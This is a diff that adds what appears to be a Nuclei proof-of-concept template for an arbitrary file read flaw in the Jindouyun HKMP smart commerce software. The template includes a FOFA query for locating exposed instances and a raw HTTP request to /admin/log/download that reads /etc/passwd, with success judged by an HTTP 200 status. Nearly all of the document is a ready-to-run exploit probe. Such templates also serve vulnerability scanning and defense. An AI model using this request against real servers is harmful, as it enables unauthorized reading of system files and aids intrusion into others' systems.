@@ -1,0 +1,27 @@
+id: poc-yfuwknisa4mhc6vd
+info:
+  name: 金斗云 HKMP智慧商业软件 download 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yfuwknisa4mhc6vd'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yfuwknisa4mhc6vd
+    fofa: body="金斗云 Copyright"
+http:
+- raw:
+  - 'GET /admin/log/download?file=/etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Encoding: gzip
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
